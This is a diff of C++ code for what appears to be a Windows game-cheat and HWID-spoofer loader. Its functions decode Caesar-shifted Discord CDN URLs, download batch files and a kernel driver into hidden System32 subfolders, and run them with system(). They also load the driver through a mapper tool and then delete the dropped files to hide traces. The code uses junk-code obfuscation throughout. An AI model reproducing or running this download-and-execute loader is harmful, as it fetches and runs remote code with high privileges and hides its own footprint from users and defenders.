@@ -157,10 +157,10 @@ void apex()
     JUNK_CODE_ONE
         JUNK_CODE_ONE
     std::string apex = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/880114575800954941/dsha.edw");
-    std::string apexpath = (dead("C:\\Windows\\Vss\\Apex.bat").c_str());
+    std::string apexpath = (dead("C:\\Windows\\System32\\1028\\Apex.bat").c_str());
     URLDownloadToFileA(NULL, apex.c_str(), apexpath.c_str(), 0, NULL);
-    system(dead("cd C:\\Windows\\Vss\\").c_str());
-    system(dead("Start C:\\Windows\\Vss\\Apex.bat").c_str());
+    system(dead("cd C:\\Windows\\System32\\1028\\").c_str());
+    system(dead("Start C:\\Windows\\System32\\1028\\Apex.bat").c_str());
 
 
 }
@@ -183,10 +183,10 @@ void gta()
 
 
     std::string gta = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/880114574483918858/jwd.edw");
-    std::string gtapath = (dead("C:\\Windows\\Vss\\gta.bat").c_str());
+    std::string gtapath = (dead("C:\\Windows\\System32\\gta.bat").c_str());
     URLDownloadToFileA(NULL, gta.c_str(), gtapath.c_str(), 0, NULL);
-    system(dead("cd C:\\Windows\\Vss\\").c_str());
-    system(dead("Start C:\\Windows\\Vss\\gta.bat").c_str());
+    system(dead("cd C:\\Windows\\System32\\").c_str());
+    system(dead("Start C:\\Windows\\System32\\gta.bat").c_str());
 
 }
 void fortnite()
@@ -208,10 +208,10 @@ void fortnite()
 
 
     std::string fortnite = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/880114573007527946/Fruwqlwh.edw");
-    std::string fortnitepath = (dead("C:\\Windows\\Vss\\Fortnite.bat").c_str());
+    std::string fortnitepath = (dead("C:\\Windows\\System32\\1040\\Fortnite.bat").c_str());
     URLDownloadToFileA(NULL, fortnite.c_str(), fortnitepath.c_str(), 0, NULL);
-    system(dead("cd C:\\Windows\\Vss\\").c_str());
-    system(dead("Start C:\\Windows\\Vss\\Fortnite.bat").c_str());
+    system(dead("cd C:\\Windows\\System32\\1040\\").c_str());
+    system(dead("Start C:\\Windows\\System32\\1040\\Fortnite.bat").c_str());
 }
 void fishingplanet()
 {
@@ -231,10 +231,10 @@ void fishingplanet()
     tlmisir();
 
     std::string fishingplanet = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/880114571648593931/ilvklqj-sodqhw.edw");
-    std::string fishingplanetpath = (dead("C:\\Windows\\Vss\\Fishing-planet.bat").c_str());
+    std::string fishingplanetpath = (dead("C:\\Windows\\System32\\2052\\Fishing-planet.bat").c_str());
     URLDownloadToFileA(NULL, fishingplanet.c_str(), fishingplanetpath.c_str(), 0, NULL);
-    system(dead("cd C:\\Windows\Vss\\").c_str());
-    system(dead("Start C:\\Windows\\Vss\\Fishing-planet.bat").c_str());
+    system(dead("cd C:\\Windows\\System32\\2052\\").c_str());
+    system(dead("Start C:\\Windows\\System32\\2052\\Fishing-planet.bat").c_str());
 
 }
 void cod()
@@ -255,10 +255,10 @@ void cod()
     tlmisir();
 
     std::string cod = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/880114570369318962/Crog-Wduh.edw");
-    std::string codpath = (dead("C:\\Windows\\Vss\\Cold-Ware.bat").c_str());
+    std::string codpath = (dead("C:\\Windows\\System32\\3082\\Cold-Ware.bat").c_str());
     URLDownloadToFileA(NULL, cod.c_str(), codpath.c_str(), 0, NULL);
-    system(dead("cd C:\\Windows\\Vss\\").c_str());
-    system(dead("Start C:\\Windows\\Vss\\Cold-Ware.bat").c_str());
+    system(dead("cd C:\\Windows\\System32\\3082\\").c_str());
+    system(dead("Start C:\\Windows\\System32\\3082\\Cold-Ware.bat").c_str());
 
 
 }
@@ -405,14 +405,31 @@ void deleter()
 
 
     //delete the files we downloaded
-    system(dead("cd C:\\Windows\Vss\\").c_str());
-    system(dead("del C:\\Windows\\Vss\\woof.sys").c_str());
-    system(dead("del C:\\Windows\\Vss\\mapper.exe").c_str());
-    system(dead("del C:\\Windows\\Vss\\Cold-Ware.bat").c_str());
-    system(dead("del C:\\Windows\\Vss\\Fishing-Planet.bat").c_str());
-    system(dead("del C:\\Windows\\Vss\\Apex.bat").c_str());
-    system(dead("del C:\\Windows\\Vss\\gta.bat").c_str());
-    system(dead("del C:\\Windows\\Vss\\Fortnite.bat").c_str());
+    system(dead("cd CC:\\Windows\\System32\\de-DE\\").c_str());
+
+    system(dead("del C:\\Windows\\System32\\de-DE\\woof.sys").c_str());
+
+    system(dead("del C:\\Windows\\System32\\de-DE\\mapper.exe").c_str());
+
+    system(dead("cd C:\\Windows\\System32\\3082\\").c_str());
+
+    system(dead("del C:\\Windows\\System32\\3082\\Cold-Ware.bat").c_str());
+
+    system(dead("cd C:\\Windows\\System32\\2050\\").c_str());
+
+    system(dead("del C:\\Windows\\System32\\2052\\Fishing-Planet.bat").c_str());
+
+    system(dead("cd C:\\Windows\\System32\\1028\\").c_str());
+
+    system(dead("del C:\\Windows\\System32\\1028\\Apex.bat").c_str());
+
+    system(dead("cd C:\\Windows\\System32\\").c_str());
+
+    system(dead("del C:\\Windows\\System32\\gta.bat").c_str());
+
+    system(dead("cd C:\\Windows\\System32\\1040\\").c_str());
+
+    system(dead("del C:\\Windows\\System32\\1040\\Fortnite.bat").c_str());
 
 
 }
@@ -520,14 +537,14 @@ void spoofer()
 
 
     string spoofer = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/881227464498630677/NhzWrri.vbv");
-    string spooferpath = (dead("C:\\Windows\\Vss\\woof.sys").c_str());
+    string spooferpath = (dead("C:\\Windows\\System32\\de-DE\\woof.sys").c_str());
     URLDownloadToFileA(NULL, spoofer.c_str(), spooferpath.c_str(), 0, NULL);
 
     string mapper = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/879745681294786600/ngpdsshu.hah");
-    string mapperpath = (dead("C:\\Windows\\Vss\\mapper.exe").c_str());
+    string mapperpath = (dead("C:\\Windows\\System32\\de-DE\\mapper.exe").c_str());
     URLDownloadToFileA(NULL, mapper.c_str(), mapperpath.c_str(), 0, NULL);
-    system(dead("cd C:\\Windows\\Vss\\").c_str());
-    system(dead("C:\\Windows\\Vss\\mapper.exe C:\\Windows\\Vss\\woof.sys").c_str());
+    system(dead("cd C:\\Windows\\System32\\de-DE\\").c_str());
+    system(dead("C:\\Windows\\System32\\de-DE\\mapper.exe C:\\Windows\\System32\\de-DE\\woof.sys").c_str());
     Sleep(2000);
     deleter();
     Sleep(2000);
